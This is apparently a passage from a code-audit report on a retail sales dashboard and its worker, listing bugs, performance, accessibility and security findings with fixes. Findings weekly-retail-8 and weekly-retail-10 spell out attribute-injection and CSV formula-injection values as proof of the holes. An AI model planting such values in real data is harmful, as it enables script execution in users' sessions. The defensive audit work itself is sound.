**Failure scenario.** Keyboard and screen-reader users cannot open the hourly breakdown at all. When it is opened with a mouse, focus stays on the page behind it and Tab walks the hidden page. On a phone the close target is small.

**Proposed fix.** Add `role="dialog" aria-modal="true" aria-labelledby="hourly-modal-title"` (and the same for the items-hour modal). On open, store `document.activeElement` and focus the close button; on close, restore focus. Change the close buttons to `p-2.5`. UX suggestion: make each Daily-tab day row a `<button>` that calls showHourlyModal, which makes the drill-down discoverable and keyboard-reachable.

<a id="store-detail-23"></a>
#### store-detail-23 — Charts aren't redrawn on a theme change, and the light-theme TODAY label and budget line fail contrast

*low · minor · accessibility · confidence high · `index.html:10856` · unverified*

**Evidence.** applyTheme ends with `if (selectedWeek) renderDashboard();` (30519) and never touches dailySalesChart or asAllStoresChart, whose tick and grid colours are fixed at render time (11010-11011, 11036-11037). The todayMarker plugin paints `ctx.fillStyle = '#22c55e'` for 'TODAY' at 9px in every theme (10856). The budget series uses `CHART_COLORS.bg = '#cbd5e1'` (10814). Computed: TODAY on white 2.28:1; budget line on white 1.48:1 (below the 3:1 non-text minimum); stale dark tick colour #9ca3af after switching to light 2.54:1.

**Failure scenario.** A user on the Chart tab toggles the theme from the sidebar: the axes keep the old theme's colours until they leave and re-enter the tab. In light theme, the dashed budget reference line is nearly invisible on white, and the TODAY label is unreadable.

**Proposed fix.** In applyTheme, add `if (currentPage === 'store-detail' && currentStoreTab === 'chart') renderDailySalesChart(currentStoreName); if (currentPage === 'all-stores-detail' && !el('as-content-chart').classList.contains('hidden')) renderAllStoresDailyChart();`. Take the budget line and TODAY colours from themeColors(): light budget '#64748b' (4.76:1), light TODAY '#166534'; dark keeps the current values.

<a id="store-detail-24"></a>
#### store-detail-24 — Worker ?action=hourly downloads a full day of orders with line items just to build 24 totals, twice per modal open

*low · minor · performance · confidence high · `worker.js:27425` · unverified*

**Evidence.** The hourly handler calls `fetchCloverOrders(store, env, sinceTs, untilTs)` (27425), which always adds `&expand=payments,lineItems` (2601). The handler reads only `order.state`, `order.total`, `order.createdTime` and `payments[].taxAmount` (27434-27453). showHourlyModal fires two of these per open (this day and the same day last week, 11079-11082), and the dashboard sparklines also call ?action=hourly (7669).

**Failure scenario.** Every hourly modal open pulls a few hundred orders per day with every line item embedded, from Clover and through the worker. That makes the modal slow on a phone connection and spends Clover rate-limit budget that the live dashboard also needs.

**Proposed fix.** Worker-only and backward-compatible: add an options argument, `fetchCloverOrders(store, env, since, until, { lineItems = true } = {})`, which builds `&expand=payments${lineItems ? ',lineItems' : ''}`. The hourly handler passes `{ lineItems: false }`. The response shape is unchanged, so it can deploy without a frontend change.

<a id="store-detail-25"></a>
#### store-detail-25 — Week-view Item Sales refetches every day, including days already cached; All Stores fires 35 concurrent requests

*low · minor · performance · confidence high · `index.html:13650` · unverified*

**Evidence.** Store detail WEEK: `Promise.all(days.map(d => fetch(url…)))` (13650-13657) never consults `itemSalesCache[`${storeKey}:${d}`]`, even when the user just tapped through those days. All Stores WEEK: `STORES.map(async s => … Promise.all(days.map(d => fetch(…))))` (14930-14942) runs 5 stores × up to 7 days = 35 requests at once, 5 of them live Clover aggregations, with no concurrency limit.

**Failure scenario.** On Saturday, 'View Whole Week (combined)' in All Stores sends 35 simultaneous requests from a phone. The live ones compete for Clover rate limits, and any failure is silently dropped (see store-detail-9). In store detail, week view re-downloads days the user has just viewed.

**Proposed fix.** Reuse cached per-day payloads: `days.map(d => itemSalesCache[`${storeKey}:${d}`] ? Promise.resolve(itemSalesCache[`${storeKey}:${d}`]) : fetch(…).then(j => (itemSalesCache[`${storeKey}:${d}`] = j)))`. Past days are immutable KV reads. For All Stores, cache per store-day in the same way and cap concurrency at about 6.

<a id="store-detail-26"></a>
#### store-detail-26 — Negative amounts render as '$-4.00' in Transactions and Item Sales instead of the app's '−$4.00'

*low · minor · ui-ux · confidence high · `index.html:14344` · unverified*

**Evidence.** fmtDollar is `'$' + n.toLocaleString(…)` (7846-7849), so `fmtDollar(-4)` gives '$-4.00' (checked in node). The Transactions amount cell `${fmtDollar(r.amount || 0)}` (14344) and the drawer's `cell('Amount', fmtDollar(r.amount || 0), true)` (14463) receive negative refund and manual-refund amounts from the worker. Item category and L3 net sales (13985, 14047) can also be negative on refund-heavy rows. Everywhere else in scope the app writes `'−' + fmtDollar(Math.abs(x))`, for example 14304.

**Failure scenario.** The Refunds tab lists '$-4.00' and '$-20.00' while the summary strip above it says '−$24.00', so the same refund is formatted two ways in the same panel.

**Proposed fix.** Add `const fmtSigned = n => (n < 0 ? '−' : '') + fmtDollar(Math.abs(n || 0));` and use it at 14344 and 14463, and for the net cells in the two items renderers.

<a id="store-detail-27"></a>
#### store-detail-27 — Worker ?action=weekly-store-detail has no date-range cap: one KV read per day can exceed the ~1,000-subrequest limit

*low · minor · performance · confidence medium · `worker.js:20537` · unverified*

**Evidence.** `const dates = wrsGateDates(store, enumDatesInclusive(rFrom, rTo)); const bundle = await buildStoreWeekly(env, store, dates);` (20537-20538). buildStoreWeekly does `Promise.all(dates.map(d => env.SALES_SNAPSHOTS.get(`items:${lc}:${d}`)))` (3187-3191). The only validation is the YYYY-MM-DD format (20530). Other range endpoints in this file enforce caps (WRS_RANGE_FULL_MAX_DAYS = 120, item-l2-totals 366).

**Failure scenario.** A request with from=2025-01-01&to=2026-12-31 (730 days, allowed for any signed-in BL user) fans out 730 KV reads. Wider ranges hit Cloudflare's subrequest ceiling and return a 500, and each such call is an expensive amplification.

**Proposed fix.** Worker-only: `if (dates.length > 400) return new Response(JSON.stringify({ error: 'Range too wide (max 400 days)' }), { status: 400, headers: corsJson });` placed before buildStoreWeekly. The WRS client asks for at most ~365 days, so nothing breaks; confirm by grepping the wrsData.from/to caps.

<a id="store-detail-28"></a>
#### store-detail-28 — Daily tab's month/week picker changes only the Daily table; the header, hero, Chart, Items and Transactions stay on the dashboard week

*low · minor · ui-ux · confidence high · `index.html:10463` · unverified*

**Evidence.** `function onSdWeekChange(value) { sdWeekFilter = value; if (currentStoreName) el('sd-content-weekly').innerHTML = buildWeeklyTable(currentStoreName); }` (10463-10466). The subtitle and chip are set once from selectedWeek (`Week ${selectedWeek} · Daily Breakdown`, 11376-11378), and renderDailySalesChart, the hero and both day strips read selectedWeek (10917, 11381, 13827). The decoupling is deliberate (comment at 10345-10348), but nothing on screen tells the user.

**Failure scenario.** A manager picks Week 36 in the Daily tab. The header still says 'Week 39 · Daily Breakdown', the hero says 'This Week', and switching to Chart silently shows Week 39, so two different weeks are on screen with no cue.

**Proposed fix.** Smallest honest change: when sdWeekFilter !== selectedWeek, update the subtitle to 'Week 39 · browsing Week 36 in Daily' and show a 'Back to Week 39' link in the selector bar that clears sdMonthFilter and sdWeekFilter. The alternative is to have Chart, Items and Transactions follow sdWeekFilter, which is a larger behaviour change to agree with Brian first.

</details>

<a id="weekly-retail"></a>
### Retail Summary

The Retail Summary is carefully built. Worker store scoping and the fail-closed financial gate cover all five endpoints, Clover strings are escaped in text positions, the lazy store-detail fetch drops stale results, and the Categories tab refuses over-budget ranges before sending a request. I found three high-severity cases where the page shows wrong figures, and all three were confirmed. (1) A failed range load hides its own error, because the `finally` hides the error box. The chip then says the new range while the panes still show the old range's figures; a browser run confirmed this. (2) On the Categories tab, today's missing item snapshot is counted as $0. The default "This Week" view therefore shows a false drop: −33.3% on perfectly flat test data on a Tuesday. (3) T13's "% Budget" row under the Net card divides only the 12 merchandise categories by the full budget, so it disagrees with the top table for the same week. Other real problems: no guard against out-of-order responses in three loaders; a "This Week" that goes stale in a long-running PWA and that Refresh cannot move forward; quotes left unescaped in `title=` attributes, which lets a Clover category name inject an event handler (confirmed in a browser); and a Categories re-render that measured about 0.8 s on a desktop CPU and about 3.5 s at 4× CPU throttle for L3, all stores, 30 days. That cost is almost all eager `ctShort` calls inside `ctVsRows`, which runs three times per render. Smaller issues cover exports (Categories cannot be exported; glyphs and L3 counts leak into category labels), phone layout (store tiles overflow by 27–37 px at 393 px), store tabs shown to managers for stores outside their scope, GPM shown as 100% when no cost is known, and a few contrast and keyboard gaps.

| ID | Sev | Size | Category | Finding | Where | Verified |
|---|---|---|---|---|---|---|
| [weekly-retail-1](#weekly-retail-1) | high | minor | bug | A failed Retail Summary load hides its own error and leaves the previous range's numbers under the new range chip | `index.html:19863` | unverified |
| [weekly-retail-2](#weekly-retail-2) | high | minor | bug | Categories 'Vs' counts today's not-yet-written snapshot as $0, so the default This Week view reports a false decline | `index.html:20320` | unverified |
| [weekly-retail-3](#weekly-retail-3) | high | minor | bug | T13 Net card '% Budget' divides only the 12 merchandise categories by the full chain budget | `index.html:22099` | unverified |
| [weekly-retail-4](#weekly-retail-4) | medium | minor | bug | No out-of-order guard on loadWeeklyRetail, loadT13 or loadCatTrend, so a slow older response overwrites the current view | `index.html:20417` | unverified |
| [weekly-retail-5](#weekly-retail-5) | medium | minor | bug | 'This Week' goes stale in a long-running PWA, and Refresh / pull-to-refresh cannot move it forward | `index.html:19844` | unverified |
| [weekly-retail-6](#weekly-retail-6) | medium | minor | performance | A Categories re-render costs about 0.8 s on a desktop CPU and about 3.5 s at 4× throttle (L3, all stores, 30 days), mostly eager label cleaning | `index.html:20089` | unverified |
| [weekly-retail-7](#weekly-retail-7) | medium | minor | performance | Category series have no request cache: store or level toggles and page-range changes refetch (live Clover reads on the hourly grain) | `index.html:20355` | unverified |
| [weekly-retail-8](#weekly-retail-8) | medium | minor | security | Clover category names reach title="..." attributes through escapeHtml, which does not escape quotes (attribute and handler injection) | `index.html:21069` | unverified |
| [weekly-retail-9](#weekly-retail-9) | medium | minor | bug | Download PDF/CSV always fails on the Categories tab ('No active tab to export.') | `index.html:15300` | unverified |
| [weekly-retail-10](#weekly-retail-10) | medium | minor | bug | Export fidelity: chevrons and L3 counts leak into category labels, the KPI scan matches nothing, and CSV cells are not neutralised against formula injection | `index.html:15394` | unverified |
| [weekly-retail-11](#weekly-retail-11) | medium | minor | ui-ux | Managers scoped to their own stores still see all seven store tabs; the others show 'No data' or 'HTTP 403' | `index.html:1917` | unverified |
| [weekly-retail-12](#weekly-retail-12) | medium | minor | ui-ux | Store tab at 393 px: Retail/Bin/Auction/Net and profit-strip values overflow their tiles by 27–37 px | `index.html:22261` | unverified |
| [weekly-retail-13](#weekly-retail-13) | medium | minor | bug | Categories with no cost source show 'GPM 100%' in green (and 100.0% in the detail table) | `index.html:22302` | unverified |
| [weekly-retail-14](#weekly-retail-14) | medium | minor | accessibility | Keyboard and screen readers cannot operate the T13 row expanders, store category rows, T13 store chips or the calendar days | `index.html:22034` | unverified |
| [weekly-retail-15](#weekly-retail-15) | low | minor | ui-ux | In light mode the 'Summary' tab stays green after another tab is selected, so two tabs look active | `index.html:19922` | unverified |
| [weekly-retail-16](#weekly-retail-16) | low | minor | accessibility | Contrast: positive variance text-green-600 is 3.30:1 in light; the Categories ▼ figure uses #ef4444 as dark-theme text (3.88–4.29:1 on its grounds) | `index.html:17309` | unverified |
| [weekly-retail-17](#weekly-retail-17) | low | minor | bug | Sign and rounding glitches: '$-1,234' and '$-0', negatives hidden as '—', '−0.0%', and '100%' in red while under budget | `index.html:20021` | unverified |
| [weekly-retail-18](#weekly-retail-18) | low | minor | ui-ux | Pace colours use 95% for amber here but 80% everywhere else (DESIGN §2.1) | `index.html:21513` | unverified |
| [weekly-retail-19](#weekly-retail-19) | low | minor | bug | A failed jsPDF download sticks: every later PDF attempt fails until the app is relaunched | `index.html:15274` | unverified |
| [weekly-retail-20](#weekly-retail-20) | low | minor | ui-ux | When budget is 0 the hero and leaderboard show '+$<net sales> of $0.00 budget' in green; the 'No budget set' branch never runs | `index.html:21509` | unverified |
| [weekly-retail-21](#weekly-retail-21) | low | minor | ui-ux | Phone controls: the tab strip wraps to 4 rows, the Categories control bar is 360 px tall, controls are 27–29 px high, and an 11 px select triggers iOS zoom | `index.html:1913` | unverified |
| [weekly-retail-22](#weekly-retail-22) | low | minor | ui-ux | On the Categories tab the page-level Date Range chip does nothing, but it stays visible next to a different range | `index.html:20128` | unverified |
| [weekly-retail-23](#weekly-retail-23) | low | minor | ui-ux | Leaderboard ranks closed Holland and Wyoming with red 0% bars and no 'Closed' pill | `index.html:21559` | unverified |
| [weekly-retail-24](#weekly-retail-24) | low | major | ui-ux | T13, Summary matrix and store detail tables don't follow DESIGN §4.8 (no legend for the heat tint, no level badges or sticky header, legacy gray palette) | `index.html:22393` | unverified |

<details><summary>Details: evidence, failure scenario, proposed fix</summary>

<a id="weekly-retail-1"></a>
#### weekly-retail-1 — A failed Retail Summary load hides its own error and leaves the previous range's numbers under the new range chip

*high · minor · bug · confidence high · `index.html:19863` · unverified*

**Evidence.** loadWeeklyRetail (index.html:19856-19866):
  } catch(e) {
    wrsShowError('Failed to load weekly data: ' + e.message);
    return;
  } finally { wrsShowLoading(false); }
and wrsShowLoading (17321-17324) ALWAYS hides the error:
  el('wrs-loading').classList.toggle('hidden', !show);
  el('wrs-error').classList.toggle('hidden', true);
The `finally` runs after the catch's `return`, so the error that was just shown is hidden straight away. setWrsRange (19711) nulls wrsData but never clears the panes or the subtitle. Checked in real Chromium with every request stubbed: picked Last Month with the stub returning 500. Result: chip='Last Month', subtitle='This Week · Sep 20 – 22', #wrs-error hidden (its text was 'Failed to load weekly data: HTTP 500'), and the Summary pane still showed '$319,752.30 −$30,247.70 · 91% of $350,000.00 budget' from This Week.

**Failure scenario.** A manager on a weak phone connection (or a worker 500 on a long range) picks 'Last Month'. The loading line disappears and no error is shown. The chip now says Last Month, while the hero, leaderboard and store tabs still show This Week's totals. Store tabs opened while wrsData is null keep whichever store was painted last. On a first-visit failure the subtitle stays 'Loading…' forever, with no retry.

**Proposed fix.** In index.html:17321 hide the error only when a load STARTS:
  function wrsShowLoading(show) {
    el('wrs-loading').classList.toggle('hidden', !show);
    if (show) el('wrs-error').classList.add('hidden');
  }
In the catch at 19863, also stop the stale figures from reading as the new range: `el('wrs-subtitle').textContent = wrsRange.label + ' · ' + fmtRangeShort(wrsRange.from, wrsRange.to) + ' — couldn\'t load';` and clear the summary, T13 and store panes (`['summary','t13','store'].forEach(p => el('wrs-pane-'+p).innerHTML = '')`). Add a Retry button to #wrs-error that calls loadWeeklyRetail(true) (DESIGN §5 'Inline retry'). Verify by stubbing a 500 in the browser harness: the error must be visible and the panes empty.

<a id="weekly-retail-2"></a>
#### weekly-retail-2 — Categories 'Vs' counts today's not-yet-written snapshot as $0, so the default This Week view reports a false decline

*high · minor · bug · confidence high · `index.html:20320` · unverified*

**Evidence.** ctRangeA defaults to resolvePreset('thisWeek') (20127-20133), which ends at TODAY. The per-day feed only has a day once `items:<store>:<date>` exists. That key is written by the 23:55 ET cron (worker.js:28269 '"55 3 * * *" — nightly end-of-day snapshot rollup' → saveItemSalesSnapshot at 28331); ORIENT.md says the same about today. ctSlotValue (20320-20339) starts `let acc = 0` and adds `|| {}` misses, so a slot with no snapshot returns 0, not null. ctDrawVs (20785-20788) then sums `cur` over every point against B's matching full day. The helper that was meant to clip, `const ctLastClosedDay = () => ...` (20252), is never called. In a browser with flat synthetic data (every day identical, today absent, as in production), the default card read '▼ −33.3% −$84,000'. Every category row also read '▼ −33.3%'. The status line says nothing about it, and the legend (21104) claims 'A day with no snapshot is absent rather than counted as zero sales'.

**Failure scenario.** On any Monday–Saturday before 23:55 ET, anyone opening Retail → Categories sees every category down by about 1/N of the week: roughly −50% on Monday and −33% on Tuesday. The chart line also dives to 0 on today's point. Sunday escapes only because auto picks the live hourly grain. Longer presets that include today (This Month, Last 30 Days) are biased by about 1/N too.

**Proposed fix.** Frontend only. In ctVsWindow (or ctRangeA/ctRangeB): when grain !== 'hour' and a range's `to` is ≥ etTodayStr(), clip it to ctYmd(ctLastClosedDay()). Clip the unpinned B to the same length, since ctAutoB derives from A. Add one status-line sentence: 'Today has no category snapshot until the nightly close, so both ranges stop at <date>.' Alternatively, have ctSlotValue return null when no store has any of the slot keys, and sum only the indices where both cur and prv are non-null. Verify in the browser harness that flat data reads 0.0%.

<a id="weekly-retail-3"></a>
#### weekly-retail-3 — T13 Net card '% Budget' divides only the 12 merchandise categories by the full chain budget

*high · minor · bug · confidence high · `index.html:22099` · unverified*

**Evidence.** renderL2Card budget rows (22095-22101):
  ${grandVals.map((v, i) => { const b = opts.budget[i]; ... `${Math.round(v / b * 100)}%` })}
  ... Math.round(grandTotal / budTot * 100) + '%'
For the net card, grandVals (22060-22063) is `T13_L2_CATS.reduce((s, cat) => s + ((perWeek[i] || {})[cat] || 0), 0)`. That is only the 12 categories: it drops Auction (buildStoreWeekly injects it as its own L2, worker.js:3217-3236), Custom Sales, Other/Non-Item and refunds. The budget, `weeklyBudget`, is the full store budget (21775). The code documents the gap itself at 22079-22082: 'that gap runs 2–11% and is growing'. The top table on the same tab computes % Budget from the stores' all-revenue netSales: `((gt / bud) * 100).toFixed(1) + '%'` (21778). The two rows disagree and are rounded differently.

**Failure scenario.** A week where the chain did $250k against a $248k budget reads '100.8%' (green) in the Weekly Net Sales table. The '% Budget' row under Combined Stores Category Net Sales, a few cards down, reads '94%' in red for the same week, because about $15k of auction and custom sales is left out of the numerator.

**Proposed fix.** weeklyNetAll (21902, all-category revenue for the filtered stores) is already computed. Pass it into the net card: `renderL2Card(netTitle, l2Net, fmtMoney, { ..., budget: weeklyBudget, budgetNum: weeklyNetAll })`. In the % Budget row use `const num = opts.budgetNum ? opts.budgetNum[i] : v` and `sum(opts.budgetNum)` for the total. Use `.toFixed(1)` in both places so the two tables agree to the decimal.

<a id="weekly-retail-4"></a>
#### weekly-retail-4 — No out-of-order guard on loadWeeklyRetail, loadT13 or loadCatTrend, so a slow older response overwrites the current view

*medium · minor · bug · confidence high · `index.html:20417` · unverified*

**Evidence.** loadWeeklyRetail (19857-19862): `const data = await cachedFetch(...); wrsData = data; ... el('wrs-subtitle').textContent = wrsRange.label + ...`. It does not check whether wrsRange changed while it waited, so the CURRENT label goes on whichever payload lands last. loadT13 (19875-19877): `wrsT13Data = data;` has the same problem. loadCatTrend (20413-20419): `const [pa, pb] = await Promise.all([...]); ctDaily = ctMergeSeries(pa, pb); ctDailyKey = key;` stores the OLD key and data even when ctState/ctA changed during the await, and then renders with the new ctState. Only showWrsStorePane has a guard (19891/19898: `if (!wrsData || (wrsData.from + '|' + wrsData.to) !== reqRange) return;`). The pills stay clickable while ctLoading shows.

**Failure scenario.** (a) Pick 'Last 12 Months', then 'This Week' before it returns. If the year payload lands second, the page shows 12 months of sales under 'This Week · Sep 20 – 22'. (b) On Categories, switch Store from All to BL1 and back to All. If BL1's request finishes last, ctDaily holds only BL1 while ctStores() sums 7 stores, so the chart and rows show one store's numbers labelled '7 stores'. Row clicks keep that stale data because they only re-render. The hourly grain (live Clover reads, several seconds) makes this easy to hit.

**Proposed fix.** Add a per-loader sequence number. loadWeeklyRetail: `const seq = ++wrsSeq; ... const data = await cachedFetch(...); if (seq !== wrsSeq) return;` (also skip the finally's wrsShowLoading(false) when superseded). loadT13: capture `const end = wrsRange.to` and drop the result if `wrsRange.to !== end || wrsCurrentTab` changed. loadCatTrend: `const seq = ++ctSeq;` after the await `if (seq !== ctSeq) return;`, before assigning ctDaily/ctDailyKey or clearing ctLoading. Test with a browser stub that delays the first response by 500 ms.

<a id="weekly-retail-5"></a>
#### weekly-retail-5 — 'This Week' goes stale in a long-running PWA, and Refresh / pull-to-refresh cannot move it forward

*medium · minor · bug · confidence high · `index.html:19844` · unverified*

**Evidence.** initWeeklyRetail (19843-19850): `if (wrsData) return;` The only place a relative preset is re-resolved (`wrsRange = resolvePreset(wrsRange.presetId || 'thisWeek', ...)`) sits after that early return. wrsManualRefresh (21118-21125) and pullRefreshAction (21460-21465) null wrsData and call loadWeeklyRetail(true), which reuses the stored `wrsRange.from/to`. ctRangeA (20127-20133) resolves ctA once and caches it forever. The app has no visibilitychange/pageshow handler (grep).

**Failure scenario.** A manager's installed PWA stays open from Saturday into Monday. On reopening Retail, the chip reads 'This Week' and the subtitle 'This Week · Sep 13 – 19': last week's data. Pulling to refresh re-fetches the same Sep 13–19 dates. The only fix is picking the preset again or relaunching the app. Categories' 'Showing' chip is frozen the same way.

**Proposed fix.** Add a small helper: `function wrsAdvanceRange(){ if (wrsRange.presetId && wrsRange.presetId !== 'custom') { const r = resolvePreset(wrsRange.presetId); if (r.from !== wrsRange.from || r.to !== wrsRange.to) { setWrsRange(r.presetId); return true; } } return false; }`. Call it at the top of initWeeklyRetail (before `if (wrsData) return`) and in wrsManualRefresh/pullRefreshAction before reloading. Do the same for ctA when ctA.presetId is set: re-resolve it and clear ctDailyKey if it moved.

<a id="weekly-retail-6"></a>
#### weekly-retail-6 — A Categories re-render costs about 0.8 s on a desktop CPU and about 3.5 s at 4× throttle (L3, all stores, 30 days), mostly eager label cleaning

*medium · minor · performance · confidence high · `index.html:20089` · unverified*

**Evidence.** ctVsRows (20069-20096) calls `add(l2 + ' :: ' + l3, l2, l3, ctShort(l3))` for every store × date × L3. ctShort, with its regex split and title-casing, runs as an ARGUMENT even when `seen` already has the row, so about 50k times per call at 7 stores × 30 days × 240 L3s. renderCatTrend calls ctVsRows three times per render: through ctBucketRows (20229), ctDrawStatus (20719) and `ctDrawVs(ctVsRows())` (20466). In Vs view it also fills per-row bucket values that nothing uses. Measured in Chromium at 393 px with synthetic L3 data (7 stores, 30 days, 12 L2 × 20 L3, 240 rows): renderCatTrend took 798–855 ms at CPU×1 and 3376–3677 ms at CPU×4; the Table view took 290 ms / 1377 ms. CDP profile of two renders: renderCatTrend 1980 ms inclusive, of which ctVsRows was 1828 ms, ctShort/ctCleanParts 791 ms and ctTitleCase 574 ms. The drawing itself (ctDrawVs 58 ms, ctDrawRows 45 ms) is cheap.

**Failure scenario.** On a mid-range phone, every row click (`b.onclick = () => { ctState.focus = ...; renderCatTrend(); }`), Measure/View/Scale toggle and Grid cell pick freezes the page for 3–4 s at L3. It feels broken and invites repeat taps, which queue more full re-renders.

**Proposed fix.** (1) Build the label only when the row is created: `const add = (key, l2, l3, labelOf) => { let r = seen.get(key); if (!r) { r = { key, l2, l3, label: labelOf(), values: [] }; ... } }` and call `add(k, l2, l3, () => ctShort(l3))`. Or memoize ctShort/ctPath in a module-level Map. (2) Compute `const rows = ctVsRows()` once in renderCatTrend and pass it to ctBucketRows, ctDrawStatus and ctDrawVs instead of each recomputing it. (3) Skip the per-row `values` loop in ctBucketRows when ctState.view === 'vs'. Re-measure with the same harness; the target is well under 100 ms at CPU×1.

<a id="weekly-retail-7"></a>
#### weekly-retail-7 — Category series have no request cache: store or level toggles and page-range changes refetch (live Clover reads on the hourly grain)

*medium · minor · performance · confidence high · `index.html:20355` · unverified*

**Evidence.** ctFetchRange uses a raw `await fetch(`${WORKER_BASE}?action=${action}&${qs}`...)` (20355), not cachedFetch. The only memo is the single last key, `if (key !== ctDailyKey)` (20414), and each store/level/rule/pin handler clears it: `ctDailyKey = ''` at 20630, 20647, 20664 and 20704. setWrsRange (19711) and both refresh paths also clear `ctDaily = null; ctDailyKey = ''`, even though Categories' A/B do not depend on the page range. In the browser, toggling Store BL1 → All → BL1 made 6 category-series requests (2 per switch), and returning to BL1 refetched data fetched seconds earlier. With the hour grain, each refetch is category-hours, which reads Clover live per store-day (worker.js:20907+). A range switch also serialises T13 and Categories behind weekly-summary, because renderWrsActiveTab only runs after loadWeeklyRetail resolves (19867).

**Failure scenario.** An admin comparing stores taps through the seven store chips and back. Every tap waits a full round trip of about 210 KV reads, even for a store just viewed. On a Sunday (auto → hourly) each tap also triggers 1–7 live Clover order pulls, which costs Clover rate limit for data that was already on screen. Changing the page-level range while on Categories refetches identical A/B data.

**Proposed fix.** Add a small Map cache in ctFetchRange keyed by the full URL: `const hit = ctSeriesCache.get(url); if (hit && Date.now() < hit.exp) return hit.data;`. Store on res.ok with a 5-minute TTL, matching cachedFetch. Ranges that end before today could get a longer TTL because past days are immutable. Clear it in wrsManualRefresh/pullRefreshAction next to `_apiCache.clear()`. Remove `ctDaily = null; ctDailyKey = ''` from setWrsRange (19711), since the page range does not feed ctA/ctB. Optionally, in setWrsRange start loadT13 in parallel when wrsCurrentTab === 't13' instead of waiting for weekly-summary.

<a id="weekly-retail-8"></a>
#### weekly-retail-8 — Clover category names reach title="..." attributes through escapeHtml, which does not escape quotes (attribute and handler injection)

*medium · minor · security · confidence high · `index.html:21069` · unverified*

**Evidence.** escapeHtml (7753-7757) serialises a text node: `div.appendChild(document.createTextNode(String(str))); return div.innerHTML;`, which escapes only & < >. Confirmed in Chromium: escapeHtml(`a"b'c<d>`) → `a"b'c&lt;d&gt;`. This page puts L3 names (raw Clover category names after normalizeL3Key, worker.js:3025-3029) into attributes: ctDrawTable `<span title="${escapeHtml(r.l3)}">` (21069); the Trend legend `title="${escapeHtml(s.key === CT_OTHER ? (s.members || []).join(', ') : s.key)}"` (20987); T13 expanded rows `title="${escapeHtml(nm)}"` (22047). Rendering `<td title="${escapeHtml('TVS 55" onmouseover="window.__pwned=1" x="')}">` produced attributes [title=TVS 55, onmouseover=window.__pwned=1, x=]. Separately, the store table's expander `onclick="toggleL2Expansion('${escapeHtml(storeKey)}','${escapeHtml(row.category)}')"` (22356) does not escape `'`, unlike the card row at 22315, which does `.replace(/'/g, "\\'")`.

**Failure scenario.** Anyone who can rename a category in a store's Clover dashboard can name one `Rugs" onmouseover="fetch('/?action=…')`. When a superuser hovers that row in Categories → Table (L3), Trend legend or an expanded T13 row, the handler runs in their session and can call any superuser endpoint. An innocent name like `TV 55"` also corrupts the cell markup. A `'` in an L2 name makes that row's ▸ expander throw a SyntaxError.

**Proposed fix.** Add an attribute escaper next to the page's helpers: `const escAttr = s => escapeHtml(s).replace(/"/g, '&quot;').replace(/'/g, '&#39;');`. Use it at 21069, 20987 and 22047. At 22356 use the same pattern as 22315: `escapeHtml(String(row.category).replace(/'/g, "\\'"))`. Do not change escapeHtml globally in this fix: call sites such as 22034 do `escapeHtml(x).replace(/'/g, ...)` and would break. That app-wide change deserves its own task.

<a id="weekly-retail-9"></a>
#### weekly-retail-9 — Download PDF/CSV always fails on the Categories tab ('No active tab to export.')

*medium · minor · bug · confidence high · `index.html:15300` · unverified*

**Evidence.** Both exporters pick the pane from a list that leaves out Categories: `[el('wrs-pane-summary'), el('wrs-pane-t13'), el('wrs-pane-store')].find(p => p && !p.classList.contains('hidden'))` (15299-15301 PDF, 15473-15475 CSV), then `if (!visiblePane) { uiAlert('No active tab to export.'); return; }`. The Download button stays enabled on that tab (markup 1892-1907). The Categories block comment (19961-19964) assumes this export path covers the pane ('downloadWrsAsPdf scrapes the live DOM').

**Failure scenario.** An admin builds an L3 quarter-over-quarter comparison on Categories, taps Download → CSV, and gets a dialog saying there is no active tab. The only way out is copying numbers by hand.

**Proposed fix.** Add a Categories branch at the top of downloadWrsAsCsv/downloadWrsAsPdf: when `wrsCurrentTab === 'categories'`, build rows from `ctBucketRows()` (header: 'Category', ...buckets.map(b => b.long), 'Total'; one row per `r.label`/`r.values`/`r.total`, raw numbers not formatted strings), with a subtitle line for `ctVsWindow().curLabel` vs `prvLabel`, store scope and measure. Otherwise, include `el('wrs-pane-categories')` in the list and hide or disable Download while ctState.view !== 'table'.

<a id="weekly-retail-10"></a>
#### weekly-retail-10 — Export fidelity: chevrons and L3 counts leak into category labels, the KPI scan matches nothing, and CSV cells are not neutralised against formula injection

*medium · minor · bug · confidence high · `index.html:15394` · unverified*

**Evidence.** Cells are read with `c.textContent.replace(/\s+/g, ' ').trim()` (15394/15397, 15519/15522). The T13 L2 label cell is `${chevron}${escapeHtml(cat)}${kids.length ? `<span class="ml-1.5 ...">${kids.length}</span>` : ''}` (22037). Its textContent, verified in Chromium, is '▸Consumable Food20': the glyph and the L3 count are glued to the name. The store table label carries a `<button>▸</button>` or '◦' (22356-22357), giving '▸Hardlines'. U+25B8 is outside the WinAnsi encoding of jsPDF's built-in Helvetica, so the PDF prints a garbage glyph. The KPI scan `visiblePane.querySelectorAll('.text-2xl, .text-xl, .text-3xl')` (15351, 15496) finds no element anywhere in renderWrsSummary/renderWrsStore (grep over 21499-22427). The hero is text-4xl and the tiles are text-[15px]/[14px], so both PDF and CSV silently drop the hero (net vs budget, pace) and the store Retail/Bin/Auction split. csvCell (15482-15485) only quotes; it never prefixes a leading = + @. The store table's expanded Custom Sales L3 rows are raw cashier-typed item names (worker.js:4088-4090).

**Failure scenario.** A district manager opens the T13 CSV in Excel. The category column reads 'Consumable Food20' and 'Hardlines14', so lookups against the category list fail. The Summary PDF has no company total vs budget at the top. A custom sale typed as `=HYPERLINK("http://x","Refund")` becomes a live formula in the store CSV, and a category name starting with '-' becomes a #NAME? error.

**Proposed fix.** (1) Give decorative spans `data-x` (chevrons, kid counts) and read cells via a helper: `const cellText = c => { const k = c.cloneNode(true); k.querySelectorAll('[data-x],button').forEach(n => n.remove()); return k.textContent.replace(/\s+/g,' ').trim(); }`. Use it in both exporters. (2) Replace the text-size heuristic with explicit markers: add `data-kpi="Net sales"` to the hero and tile value elements and scan `[data-kpi]`. (3) In csvCell: `if (/^[=+@\t\r]/.test(s) || /^-(?![\d$.,])/.test(s)) s = "'" + s;`. This keeps '-$1,234.56' numeric while neutralising formulas.

<a id="weekly-retail-11"></a>
#### weekly-retail-11 — Managers scoped to their own stores still see all seven store tabs; the others show 'No data' or 'HTTP 403'

*medium · minor · ui-ux · confidence high · `index.html:1917` · unverified*

